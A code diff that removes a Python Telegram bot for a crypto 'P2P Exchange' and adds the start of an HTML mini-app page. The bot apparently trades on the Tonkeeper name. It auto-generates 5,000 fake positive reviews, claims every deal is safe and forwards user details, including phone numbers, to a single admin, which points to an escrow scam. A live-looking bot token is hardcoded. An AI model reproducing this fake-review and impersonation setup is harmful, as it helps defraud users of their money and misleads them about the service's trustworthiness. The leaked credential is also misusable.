@@ -1,2021 +1,1982 @@
-import asyncio
-import json
-import os
-import uuid
-import random
-from datetime import datetime, timedelta
-from typing import Dict, Any, List, Optional
-
-from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import Command
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
-from aiogram.fsm.context import FSMContext
-from aiogram.fsm.state import State, StatesGroup
-from aiogram.client.default import DefaultBotProperties
-from aiohttp import web
-
-# ============================================================
-# 1. КОНФИГУРАЦИЯ
-# ============================================================
-BOT_TOKEN = "8973397612:AAGcMMe1r2DyZTziExnSVyjagdXm7fptrF8"
-MASTER_ADMIN_ID = 8855434638
-BOT_USERNAME = "tonkeeperp2p_bot"
-BOT_NAME = "P2P Exchange"
-CHANNEL_LINK = "https://t.me/tonkeeper_news"
-MINI_APP_URL = "https://saitminiapp.onrender.com"
-SUPPORT_LINK = "@p2psupbot"
-
-# ============================================================
-# 2. ИНИЦИАЛИЗАЦИЯ
-# ============================================================
-bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
-dp = Dispatcher()
-
-# ============================================================
-# 3. ФАЙЛЫ
-# ============================================================
-FILES = {
-    "deals": "deals.json",
-    "admins": "admins.json",
-    "balance": "balance.json",
-    "reviews": "reviews.json",
-    "withdraw": "withdraw_requests.json",
-    "verification": "verification_requests.json",
-    "verification_sessions": "verification_sessions.json",
-    "logs": "logs.json",
-    "user_language": "user_language.json",
-    "stats": "stats.json"
-}
-
-def load_json(file):
-    if os.path.exists(file):
-        with open(file, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    return {}
-
-def save_json(file, data):
-    with open(file, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=2, ensure_ascii=False)
-
-deals = load_json(FILES["deals"])
-admins = load_json(FILES["admins"])
-balance = load_json(FILES["balance"])
-reviews = load_json(FILES["reviews"])
-withdraw_requests = load_json(FILES["withdraw"])
-verification_requests = load_json(FILES["verification"])
-verification_sessions = load_json(FILES["verification_sessions"])
-logs = load_json(FILES["logs"])
-user_language = load_json(FILES["user_language"])
-stats = load_json(FILES["stats"])
-
-# ============================================================
-# 4. ГЕНЕРАЦИЯ ОТЗЫВОВ
-# ============================================================
-def generate_reviews():
-    if len(reviews) >= 5000:
-        return
-    review_texts = [
-        "Отличная платформа! Всё работает быстро и надёжно.",
-        "Лучший P2P обменник! Рекомендую всем друзьям.",
-        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
-        "Отличная поддержка! Помогли разобраться с выводом.",
-        "Наконец-то нашёл нормальный обменник. Всё честно.",
-        "Сделал первую сделку, всё прошло гладко. Спасибо!",
-        "За сутки сделал 5 сделок, все успешно завершены.",
-        "Очень доволен сервисом. Вывод моментальный.",
-        "Пользуюсь уже месяц, ни одной проблемы.",
-        "Лучший сервис в Telegram! Успехов разработчикам."
-    ]
-    for i in range(5000):
-        review_id = str(uuid.uuid4())[:8]
-        reviews[review_id] = {
-            "id": review_id,
-            "user": "Аноним",
-            "rating": random.randint(4, 5),
-            "text": random.choice(review_texts),
-            "anonymous": True,
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-            "user_id": None
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>🔥 P2P Exchange</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: #111827;
+            --bg-card: rgba(17,24,39,0.7);
+            --border-color: rgba(255,255,255,0.06);
+            --text-primary: #ffffff;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --gold: #f0b90b;
+            --ton-blue: #0098ea;
+            --ton-gradient: linear-gradient(135deg, #0098ea, #0077be);
+            --radius: 20px;
+            --radius-sm: 12px;
+            --success: #2ecc71;
+            --danger: #e74c3c;
+            --warning: #f39c12;
         }
-    save_json(FILES["reviews"], reviews)
-
-generate_reviews()
-
-# ============================================================
-# 5. ЯЗЫКИ
-# ============================================================
-LANGUAGES = {
-    "ru": "🇷🇺 Русский",
-    "en": "🇬🇧 English",
-    "zh": "🇨🇳 中文",
-    "ar": "🇸🇦 العربية"
-}
-
-LOCALE = {
-    "ru": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
-        "feature1": "Честные сделки между продавцами и покупателями",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "Гарант безопасности с обеих сторон",
-        "feature4": "Премиум поддержка 24/7",
-        "how_it_works": "КАК ЭТО РАБОТАЕТ",
-        "step1": "Создайте сделку в Mini App",
-        "step2": "Отправьте ссылку покупателю",
-        "step3": "Покупатель выбирает способ оплаты",
-        "step4": "Администратор проверяет оплату",
-        "step5": "Продавец нажимает «Передал товар»",
-        "step6": "Покупатель нажимает «Получил товар»",
-        "step7": "Деньги зачисляются на баланс продавца",
-        "our_channel": "НАШ КАНАЛ",
-        "support": "ПОДДЕРЖКА",
-        "support_contact": "@p2psupbot",
-        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
-        "create_deal": "СОЗДАТЬ СДЕЛКУ",
-        "my_balance": "МОЙ БАЛАНС",
-        "my_deals": "МОИ СДЕЛКИ",
-        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
-        "faq": "ОТЗЫВЫ",
-        "channel": "КАНАЛ",
-        "admin_panel": "АДМИН ПАНЕЛЬ",
-        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
-        "your_balance": "ВАШ БАЛАНС",
-        "main_menu": "ГЛАВНОЕ МЕНЮ",
-        "no_deals": "У ВАС НЕТ СДЕЛОК",
-        "your_deals": "ВАШИ СДЕЛКИ",
-        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
-        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
-        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
-        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ ТОВАРА",
-        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ ТОВАРА",
-        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
-        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
-        "choose_payment_method": "ВЫБЕРИТЕ СПОСОБ ОПЛАТЫ",
-        "pay_by_rekvisits": "ОПЛАТИТЬ ПО РЕКВИЗИТАМ",
-        "pay_by_balance": "ОПЛАТИТЬ С БАЛАНСА",
-        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
-        "status_paid": "ОПЛАЧЕНО",
-        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
-        "status_completed": "ЗАВЕРШЕНО",
-        "select_language": "ВЫБРАТЬ ЯЗЫК",
-        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
-        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
-        "product": "ТОВАР",
-        "amount": "СУММА",
-        "seller": "ПРОДАВЕЦ",
-        "buyer": "ПОКУПАТЕЛЬ",
-        "deal": "СДЕЛКА",
-        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ ТОВАРА",
-        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ ТОВАР",
-        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
-        "contact_support": "В ПОДДЕРЖКУ",
-        "balance_added": "БАЛАНС НАЧИСЛЕН",
-        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
-        "admin_added": "АДМИН ДОБАВЛЕН",
-        "admin_removed": "АДМИН УДАЛЁН",
-        "admin_list": "СПИСОК АДМИНОВ",
-        "no_deals_total": "НЕТ СДЕЛОК",
-        "all_deals_title": "ВСЕ СДЕЛКИ",
-        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
-        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
-        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
-        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
-        "deal_created": "СДЕЛКА СОЗДАНА",
-        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ Выберите способ оплаты:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n4️⃣ Отправьте ссылку покупателю\n\n5️⃣ После оплаты:\n   • Продавец нажимает «Передал товар»\n   • Покупатель нажимает «Получил товар»\n   • Деньги зачисляются на баланс\n\n🔥 ВСЕ СДЕЛКИ БЕЗОПАСНЫ!"
-    },
-    "en": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "SECURE DEALS",
-        "feature1": "Fair deals between sellers and buyers",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "Security guarantee from both sides",
-        "feature4": "Premium 24/7 support",
-        "how_it_works": "HOW IT WORKS",
-        "step1": "Create deal in Mini App",
-        "step2": "Send link to buyer",
-        "step3": "Buyer chooses payment method",
-        "step4": "Admin verifies payment",
-        "step5": "Seller clicks 'Delivered'",
-        "step6": "Buyer clicks 'Received'",
-        "step7": "Money credited to seller's balance",
-        "our_channel": "OUR CHANNEL",
-        "support": "SUPPORT",
-        "support_contact": "@p2psupbot",
-        "start_now": "START NOW",
-        "create_deal": "CREATE DEAL",
-        "my_balance": "MY BALANCE",
-        "my_deals": "MY DEALS",
-        "how_to_deal": "HOW TO CREATE DEAL",
-        "faq": "REVIEWS",
-        "channel": "CHANNEL",
-        "admin_panel": "ADMIN PANEL",
-        "choose_action": "CHOOSE ACTION",
-        "your_balance": "YOUR BALANCE",
-        "main_menu": "MAIN MENU",
-        "no_deals": "YOU HAVE NO DEALS",
-        "your_deals": "YOUR DEALS",
-        "deal_not_found": "DEAL NOT FOUND",
-        "access_denied": "ACCESS DENIED",
-        "payment_confirmed": "PAYMENT CONFIRMED",
-        "seller_confirmed": "YOU CONFIRMED DELIVERY",
-        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
-        "deal_completed": "DEAL COMPLETED",
-        "insufficient_balance": "INSUFFICIENT BALANCE",
-        "choose_payment_method": "CHOOSE PAYMENT METHOD",
-        "pay_by_rekvisits": "PAY BY DETAILS",
-        "pay_by_balance": "PAY FROM BALANCE",
-        "status_waiting": "WAITING FOR PAYMENT",
-        "status_paid": "PAID",
-        "status_awaiting": "AWAITING CONFIRMATION",
-        "status_completed": "COMPLETED",
-        "select_language": "SELECT LANGUAGE",
-        "welcome": "WELCOME",
-        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
-        "product": "PRODUCT",
-        "amount": "AMOUNT",
-        "seller": "SELLER",
-        "buyer": "BUYER",
-        "deal": "DEAL",
-        "waiting_for_delivery": "WAITING FOR DELIVERY",
-        "seller_delivered": "SELLER DELIVERED",
-        "confirm_receipt": "CONFIRM RECEIPT",
-        "contact_support": "CONTACT SUPPORT",
-        "balance_added": "BALANCE ADDED",
-        "admin_rights": "INSUFFICIENT RIGHTS",
-        "admin_added": "ADMIN ADDED",
-        "admin_removed": "ADMIN REMOVED",
-        "admin_list": "ADMIN LIST",
-        "no_deals_total": "NO DEALS",
-        "all_deals_title": "ALL DEALS",
-        "no_active_requests": "NO ACTIVE REQUESTS",
-        "copy_link": "COPY LINK",
-        "deal_link_text": "LINK FOR BUYER",
-        "send_link_to_buyer": "SEND LINK TO BUYER",
-        "deal_created": "DEAL CREATED",
-        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Choose payment method:\n   • From balance — instantly\n   • By details — after admin check\n\n4️⃣ Send the link to the buyer\n\n5️⃣ After payment:\n   • Seller clicks 'Delivered'\n   • Buyer clicks 'Received'\n   • Money goes to balance\n\n🔥 ALL DEALS ARE SAFE!"
-    },
-    "zh": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "安全交易",
-        "feature1": "买卖双方公平交易",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "双方安全保障",
-        "feature4": "24/7高级支持",
-        "how_it_works": "运作方式",
-        "step1": "在Mini App中创建交易",
-        "step2": "发送链接给买家",
-        "step3": "买家选择支付方式",
-        "step4": "管理员验证付款",
-        "step5": "卖家点击「已交付」",
-        "step6": "买家点击「已收到」",
-        "step7": "款项计入卖家余额",
-        "our_channel": "我们的频道",
-        "support": "支持",
-        "support_contact": "@p2psupbot",
-        "start_now": "立即开始",
-        "create_deal": "创建交易",
-        "my_balance": "我的余额",
-        "my_deals": "我的交易",
-        "how_to_deal": "如何创建交易",
-        "faq": "评论",
-        "channel": "频道",
-        "admin_panel": "管理面板",
-        "choose_action": "选择操作",
-        "your_balance": "您的余额",
-        "main_menu": "主菜单",
-        "no_deals": "您没有任何交易",
-        "your_deals": "您的交易",
-        "deal_not_found": "交易未找到",
-        "access_denied": "访问被拒绝",
-        "payment_confirmed": "付款已确认",
-        "seller_confirmed": "您已确认交付",
-        "buyer_confirmed": "您已确认收到",
-        "deal_completed": "交易已完成",
-        "insufficient_balance": "余额不足",
-        "choose_payment_method": "选择支付方式",
-        "pay_by_rekvisits": "按信息付款",
-        "pay_by_balance": "从余额付款",
-        "status_waiting": "等待付款",
-        "status_paid": "已付款",
-        "status_awaiting": "等待确认",
-        "status_completed": "已完成",
-        "select_language": "选择语言",
-        "welcome": "欢迎",
-        "choose_language_prompt": "🌐 选择您的语言:",
-        "product": "商品",
-        "amount": "金额",
-        "seller": "卖家",
-        "buyer": "买家",
-        "deal": "交易",
-        "waiting_for_delivery": "等待交付",
-        "seller_delivered": "卖家已交付",
-        "confirm_receipt": "确认收到",
-        "contact_support": "联系客服",
-        "balance_added": "余额已添加",
-        "admin_rights": "权限不足",
-        "admin_added": "管理员已添加",
-        "admin_removed": "管理员已移除",
-        "admin_list": "管理员列表",
-        "no_deals_total": "无交易",
-        "all_deals_title": "所有交易",
-        "no_active_requests": "无活跃申请",
-        "copy_link": "复制链接",
-        "deal_link_text": "买家链接",
-        "send_link_to_buyer": "发送链接给买家",
-        "deal_created": "交易已创建",
-        "how_to_deal_text": "📖 <b>如何创建交易</b>\n\n1️⃣ 点击「创建交易」\n   → 打开 Mini App\n\n2️⃣ 填写表格：\n   • 商品名称\n   • 货币 (TON/STARS/RUB/UAH)\n   • 金额\n   • 买家用户名\n\n3️⃣ 选择支付方式：\n   • 从余额支付 — 即时\n   • 按详情支付 — 管理员检查后\n\n4️⃣ 发送链接给买家\n\n5️⃣ 付款后：\n   • 卖家点击「已交付」\n   • 买家点击「已收到」\n   • 钱款计入余额\n\n🔥 所有交易都安全！"
-    },
-    "ar": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "صفقات آمنة",
-        "feature1": "صفقات عادلة بين البائعين والمشترين",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "ضمان الأمن من كلا الجانبين",
-        "feature4": "دعم بريميوم 24/7",
-        "how_it_works": "كيف يعمل",
-        "step1": "إنشاء صفقة في Mini App",
-        "step2": "إرسال الرابط للمشتري",
-        "step3": "المشتري يختار طريقة الدفع",
-        "step4": "المدقق يتحقق من الدفع",
-        "step5": "البائع يضغط «تم التسليم»",
-        "step6": "المشتري يضغط «تم الاستلام»",
-        "step7": "تضاف الأموال إلى رصيد البائع",
-        "our_channel": "قناتنا",
-        "support": "الدعم",
-        "support_contact": "@p2psupbot",
-        "start_now": "ابدأ الآن",
-        "create_deal": "إنشاء صفقة",
-        "my_balance": "رصيدي",
-        "my_deals": "صفقاتي",
-        "how_to_deal": "كيفية إنشاء صفقة",
-        "faq": "مراجعات",
-        "channel": "القناة",
-        "admin_panel": "لوحة التحكم",
-        "choose_action": "اختر إجراء",
-        "your_balance": "رصيدك",
-        "main_menu": "القائمة الرئيسية",
-        "no_deals": "ليس لديك صفقات",
-        "your_deals": "صفقاتك",
-        "deal_not_found": "الصفقة غير موجودة",
-        "access_denied": "الوصول مرفوض",
-        "payment_confirmed": "تم تأكيد الدفع",
-        "seller_confirmed": "لقد أكدت التسليم",
-        "buyer_confirmed": "لقد أكدت الاستلام",
-        "deal_completed": "الصفقة مكتملة",
-        "insufficient_balance": "رصيد غير كافٍ",
-        "choose_payment_method": "اختر طريقة الدفع",
-        "pay_by_rekvisits": "الدفع حسب التفاصيل",
-        "pay_by_balance": "الدفع من الرصيد",
-        "status_waiting": "انتظار الدفع",
-        "status_paid": "تم الدفع",
-        "status_awaiting": "انتظار التأكيد",
-        "status_completed": "مكتملة",
-        "select_language": "اختر اللغة",
-        "welcome": "مرحباً",
-        "choose_language_prompt": "🌐 اختر لغتك:",
-        "product": "المنتج",
-        "amount": "المبلغ",
-        "seller": "البائع",
-        "buyer": "المشتري",
-        "deal": "الصفقة",
-        "waiting_for_delivery": "انتظار التسليم",
-        "seller_delivered": "البائع سلم المنتج",
-        "confirm_receipt": "تأكيد الاستلام",
-        "contact_support": "اتصل بالدعم",
-        "balance_added": "تم إضافة الرصيد",
-        "admin_rights": "صلاحيات غير كافية",
-        "admin_added": "تم إضافة المدقق",
-        "admin_removed": "تم إزالة المدقق",
-        "admin_list": "قائمة المدققين",
-        "no_deals_total": "لا توجد صفقات",
-        "all_deals_title": "جميع الصفقات",
-        "no_active_requests": "لا توجد طلبات نشطة",
-        "copy_link": "انسخ الرابط",
-        "deal_link_text": "رابط المشتري",
-        "send_link_to_buyer": "أرسل الرابط للمشتري",
-        "deal_created": "تم إنشاء الصفقة",
-        "how_to_deal_text": "📖 <b>كيفية إنشاء صفقة</b>\n\n1️⃣ اضغط «إنشاء صفقة»\n   → يفتح Mini App\n\n2️⃣ املأ النموذج:\n   • اسم المنتج\n   • العملة (TON/STARS/RUB/UAH)\n   • المبلغ\n   • اسم مستخدم المشتري\n\n3️⃣ اختر طريقة الدفع:\n   • من الرصيد — فوري\n   • حسب التفاصيل — بعد فحص المدقق\n\n4️⃣ أرسل الرابط للمشتري\n\n5️⃣ بعد الدفع:\n   • البائع يضغط «تم التسليم»\n   • المشتري يضغط «تم الاستلام»\n   • تضاف الأموال إلى الرصيد\n\n🔥 جميع الصفقات آمنة!"
-    }
-}
-
-def get_text(lang: str, key: str) -> str:
-    if lang in LOCALE and key in LOCALE[lang]:
-        return LOCALE[lang][key]
-    return LOCALE["ru"].get(key, key)
-
-# ============================================================
-# 6. ПОМОЩНИКИ
-# ============================================================
-def is_admin(user_id: int) -> bool:
-    return user_id == MASTER_ADMIN_ID or str(user_id) in admins
-
-def get_balance(user_id: int):
-    uid = str(user_id)
-    if uid not in balance:
-        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
-        save_json(FILES["balance"], balance)
-    return balance[uid]
-
-def add_balance(user_id: int, currency: str, amount: float):
-    uid = str(user_id)
-    curr = currency.lower()
-    if uid not in balance:
-        balance[uid] = {"ton": 0, "stars": 0, "rub": 0, "uah": 0, "deal_partners": {}}
-    balance[uid][curr] = balance[uid].get(curr, 0) + amount
-    save_json(FILES["balance"], balance)
-
-def get_user_language(user_id: int) -> str:
-    uid = str(user_id)
-    return user_language.get(uid, "ru")
-
-def set_user_language(user_id: int, lang: str):
-    user_language[str(user_id)] = lang
-    save_json(FILES["user_language"], user_language)
-
-def add_log(action: str, data: dict):
-    log_id = str(uuid.uuid4())[:8]
-    log_entry = {
-        "id": log_id,
-        "action": action,
-        "data": data,
-        "time": datetime.now().isoformat()
-    }
-    logs[log_id] = log_entry
-    save_json(FILES["logs"], logs)
-    
-    try:
-        asyncio.create_task(send_log_to_admin(action, data))
-    except:
-        pass
-
-async def send_log_to_admin(action: str, data: dict):
-    try:
-        text = f"📋 <b>ЛОГ ДЕЙСТВИЯ</b>\n\n"
-        text += f"📌 <b>Действие:</b> {action}\n"
-        text += f"🕐 <b>Время:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-        
-        for key, value in data.items():
-            if key == 'admin':
-                text += f"👑 <b>Админ:</b> @{value}\n"
-            elif key == 'user_id':
-                text += f"👤 <b>Пользователь ID:</b> {value}\n"
-            elif key == 'username':
-                text += f"👤 <b>Username:</b> @{value}\n"
-            elif key == 'deal_id':
-                text += f"🆔 <b>Сделка:</b> #{value}\n"
-            elif key == 'amount':
-                text += f"💰 <b>Сумма:</b> {value}\n"
-            elif key == 'currency':
-                text += f"💱 <b>Валюта:</b> {value}\n"
-            elif key == 'product':
-                text += f"📦 <b>Товар:</b> {value}\n"
-            elif key == 'buyer_username':
-                text += f"👤 <b>Покупатель:</b> @{value}\n"
-            elif key == 'seller_username':
-                text += f"👤 <b>Продавец:</b> @{value}\n"
-            elif key == 'phone':
-                text += f"📱 <b>Телефон:</b> {value}\n"
-            elif key == 'status':
-                text += f"📊 <b>Статус:</b> {value}\n"
-            else:
-                text += f"📎 <b>{key}:</b> {value}\n"
-        
-        await bot.send_message(MASTER_ADMIN_ID, text[:4000])
-    except Exception as e:
-        print(f"Ошибка отправки лога: {e}")
-
-# ============================================================
-# 7. КЛАВИАТУРЫ
-# ============================================================
-def main_menu_keyboard(user_id: int):
-    lang = get_user_language(user_id)
-    buttons = [
-        [
-            InlineKeyboardButton(text=f"📱 {get_text(lang, 'create_deal')}", web_app=WebAppInfo(url=MINI_APP_URL)),
-            InlineKeyboardButton(text=f"💰 {get_text(lang, 'my_balance')}", callback_data="menu_balance"),
-        ],
-        [
-            InlineKeyboardButton(text=f"📊 {get_text(lang, 'my_deals')}", callback_data="menu_deals"),
-            InlineKeyboardButton(text=f"📖 {get_text(lang, 'how_to_deal')}", callback_data="how_to_deal"),
-        ],
-        [
-            InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="menu_reviews"),
-            InlineKeyboardButton(text=f"📢 {get_text(lang, 'channel')}", callback_data="menu_channel"),
-        ],
-        [
-            InlineKeyboardButton(text=f"🌐 {get_text(lang, 'select_language')}", callback_data="select_language"),
-        ]
-    ]
-    if is_admin(user_id):
-        buttons.append([
-            InlineKeyboardButton(text=f"👑 {get_text(lang, 'admin_panel')}", callback_data="menu_admin"),
-        ])
-    return InlineKeyboardMarkup(inline_keyboard=buttons)
-
-def admin_panel_keyboard(user_id: int):
-    lang = get_user_language(user_id)
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'balance_added')}", callback_data="admin_add_balance")],
-        [InlineKeyboardButton(text=f"👥 {get_text(lang, 'admin_list')}", callback_data="admin_manage_admins")],
-        [InlineKeyboardButton(text=f"📊 {get_text(lang, 'all_deals_title')}", callback_data="admin_all_deals")],
-        [InlineKeyboardButton(text=f"💲 Заявки на вывод", callback_data="admin_withdraw_requests")],
-        [InlineKeyboardButton(text=f"🔐 Запросы верификации", callback_data="admin_verification_requests")],
-        [InlineKeyboardButton(text=f"⭐️ {get_text(lang, 'faq')}", callback_data="admin_manage_reviews")],
-        [InlineKeyboardButton(text=f"📋 Логи", callback_data="admin_logs")],
-        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
-    ])
-
-def back_to_main_keyboard(user_id: int):
-    lang = get_user_language(user_id)
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
-    ])
-
-def language_keyboard():
-    buttons = []
-    for lang_code, lang_name in LANGUAGES.items():
-        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
-    return InlineKeyboardMarkup(inline_keyboard=buttons)
-
-def payment_method_keyboard(deal_id: str, user_id: int):
-    lang = get_user_language(user_id)
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"💳 {get_text(lang, 'pay_by_rekvisits')}", callback_data=f"pay_rekvisits_{deal_id}")],
-        [InlineKeyboardButton(text=f"💰 {get_text(lang, 'pay_by_balance')}", callback_data=f"pay_balance_{deal_id}")],
-        [InlineKeyboardButton(text=f"◀️ {get_text(lang, 'main_menu')}", callback_data="back_to_main")]
-    ])
-
-def seller_confirm_keyboard(deal_id: str, user_id: int):
-    lang = get_user_language(user_id)
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"📦 {get_text(lang, 'seller_delivered')}", callback_data=f"seller_done_{deal_id}")]
-    ])
-
-def buyer_confirm_keyboard(deal_id: str, user_id: int):
-    lang = get_user_language(user_id)
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text=f"✅ {get_text(lang, 'confirm_receipt')}", callback_data=f"buyer_confirm_{deal_id}")],
-        [InlineKeyboardButton(text=f"🆘 {get_text(lang, 'contact_support')}", callback_data=f"support_{deal_id}")]
-    ])
-
-def currency_keyboard():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💎 TON", callback_data="curr_TON")],
-        [InlineKeyboardButton(text="⭐️ STARS", callback_data="curr_STARS")],
-        [InlineKeyboardButton(text="💰 RUB", callback_data="curr_RUB")],
-        [InlineKeyboardButton(text="🌐 UAH", callback_data="curr_UAH")],
-    ])
-
-# ============================================================
-# 8. FSM АДМИНА
-# ============================================================
-class AdminStates(StatesGroup):
-    waiting_user_id = State()
-    waiting_currency = State()
-    waiting_amount = State()
-
-# ============================================================
-# 9. ОБРАБОТЧИКИ БОТА
-# ============================================================
-@dp.message(Command("start"))
-async def cmd_start(message: types.Message):
-    if message.text and message.text.startswith("/start deal_"):
-        deal_id = message.text.split("_")[1]
-        await handle_deal_link(message, deal_id)
-        return
-    
-    uid = str(message.from_user.id)
-    if uid not in user_language:
-        await message.answer(
-            f"🌐 {get_text('ru', 'choose_language_prompt')}",
-            reply_markup=language_keyboard()
-        )
-        return
-    
-    lang = get_user_language(message.from_user.id)
-    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
-
-{get_text(lang, 'bot_desc')}
-• {get_text(lang, 'feature1')}
-• {get_text(lang, 'feature2')}
-• {get_text(lang, 'feature3')}
-• {get_text(lang, 'feature4')}
-
-📊 {get_text(lang, 'how_it_works')}:
-1️⃣ {get_text(lang, 'step1')}
-2️⃣ {get_text(lang, 'step2')}
-3️⃣ {get_text(lang, 'step3')}
-4️⃣ {get_text(lang, 'step4')}
-5️⃣ {get_text(lang, 'step5')}
-6️⃣ {get_text(lang, 'step6')}
-7️⃣ {get_text(lang, 'step7')}
-
-📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
-🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
-
-🔥 {get_text(lang, 'start_now')} 🚀"""
-    
-    await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))
-
-@dp.callback_query(lambda c: c.data.startswith("set_lang_"))
-async def set_language(callback: types.CallbackQuery):
-    lang = callback.data.split("_")[2]
-    set_user_language(callback.from_user.id, lang)
-    await callback.answer(f"{get_text(lang, 'welcome')}")
-    await cmd_start(callback.message)
-
-@dp.callback_query(lambda c: c.data == "select_language")
-async def select_language(callback: types.CallbackQuery):
-    await callback.message.edit_text(
-        f"🌐 {get_text('ru', 'choose_language_prompt')}",
-        reply_markup=language_keyboard()
-    )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "back_to_main")
-async def back_to_main(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    try:
-        await callback.message.edit_text(
-            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
-            reply_markup=main_menu_keyboard(callback.from_user.id)
-        )
-    except:
-        await callback.message.answer(
-            f"🔥 <b>P2P Exchange</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
-            reply_markup=main_menu_keyboard(callback.from_user.id)
-        )
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "menu_channel")
-async def menu_channel(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    text = f"""📢 {get_text(lang, 'our_channel')}
-
-🔥 {get_text(lang, 'subscribe')}:
-{CHANNEL_LINK}
-
-🚀 {get_text(lang, 'click_subscribe')}"""
-    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
-    await callback.answer()
-
-@dp.callback_query(lambda c: c.data == "how_to_deal")
-async def how_to_deal(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    text = get_text(lang, 'how_to_deal_text')
-    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
-    await callback.answer()
-
-# ============================================================
-# 10. БАЛАНС
-# ============================================================
-@dp.callback_query(lambda c: c.data == "menu_balance")
-async def menu_balance(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    bal = get_balance(callback.from_user.id)
-    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>
-
-💎 TON: {bal.get('ton', 0)}
-⭐️ STARS: {bal.get('stars', 0)}
